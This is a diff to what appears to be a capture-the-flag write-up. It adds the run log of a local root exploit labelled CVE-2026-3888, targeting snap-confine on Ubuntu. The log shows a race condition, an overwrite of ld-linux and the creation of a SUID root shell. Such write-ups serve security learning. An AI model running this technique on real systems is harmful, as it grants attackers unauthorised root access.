@@ -347,8 +347,64 @@ librootshell.so
 Ill transfer both to the target
 
 ```python
+jonathan@snapped:~/Documents$ ./exploit ./librootshell.so 
+================================================================
+    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
+================================================================
+[*] Payload: /home/jonathan/Documents/./librootshell.so (9056 bytes)
 
+[Phase 1] Entering Firefox sandbox...
+[+] Inner shell PID: 63538
+
+[Phase 2] Waiting for .snap deletion...
+[*] Polling (up to 30 days on stock Ubuntu).
+[*] Hint: use -s to skip.
+[+] .snap deleted.
+
+[Phase 3] Destroying cached mount namespace...
+cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_KW5if9//dev: No such file or directory
+[+] Namespace destroyed.
+
+[Phase 4] Setting up and running the race...
+[*]   Working directory: /proc/63538/cwd
+[*]   Building .snap and .exchange...
+[*]   285 entries copied to exchange directory
+[*]   Starting race...
+[*]   Monitoring snap-confine (child PID 63882)...
+
+[!]   TRIGGER — swapping directories...
+[+]   SWAP DONE — race won!
+[*]   ld-linux in namespace: jonathan:jonathan 755
+[+]   Poisoned namespace PID: 63882
+
+[Phase 5] Injecting payload into poisoned namespace...
+[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
+[*]   Planting busybox...
+[*]   Writing escape script → /tmp/sh
+[*]   Overwriting ld-linux-x86-64.so.2...
+[+]   Payload injected.
+
+[Phase 6] Triggering root via SUID snap-confine...
+[*]   snap-confine → snap-confine (SUID trigger)
+[*]   Exit status: 0
+
+[Phase 7] Verifying...
+[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
+[*] Cleaning up background processes...
+
+================================================================
+  ROOT SHELL: /var/snap/firefox/common/bash -p
+================================================================
+
+bash-5.1# whoami
+root
+bash-5.1#
 ```
+I now have access as root the intended way
+
+
+
+
 
 
 
